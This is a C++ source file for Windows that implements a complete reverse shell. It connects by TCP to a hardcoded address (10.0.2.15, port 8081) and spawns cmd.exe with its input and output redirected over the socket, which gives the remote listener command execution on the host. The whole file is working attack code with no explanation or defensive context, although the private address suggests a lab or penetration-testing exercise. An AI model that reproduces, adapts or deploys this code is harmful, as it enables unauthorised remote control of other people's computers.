#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main()
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int connection;
    char ip_addr[] = "10.0.2.15";
    int port = 8081;
    char RecvServer[512];

    // initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("(!) Failed to initialize Winsock\n");
        return 1;
    }

    // create a TCP socket
    if ((shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET) {
        printf("(!) Failed to create socket\n");
        WSACleanup();
        return 1;
    }

    // set up the socket address structure
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // connect to the server
    if ((connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL)) == SOCKET_ERROR)
    {
        printf("(!) Connection to the target server failed\n");
        WSACleanup();
        return 1;
    }

    // receive the server's welcome message
    recv(shell, RecvServer, sizeof(RecvServer), 0);

    // set up the STARTUPINFO structure for spawning a command prompt window
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // pipes stdin, stdout and stderr to socket

    // spawn cmd.exe process
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL,&si, &pi))
    {
        printf("(!) Failed to spawn cmd.exe process\n");
        WSACleanup();
        return 1;
    }

    // wait for the cmd.exe process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // clean up resources
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    memset(RecvServer, 0, sizeof(RecvServer));
    WSACleanup(); // clean up Winsock resources

    return 0;
}
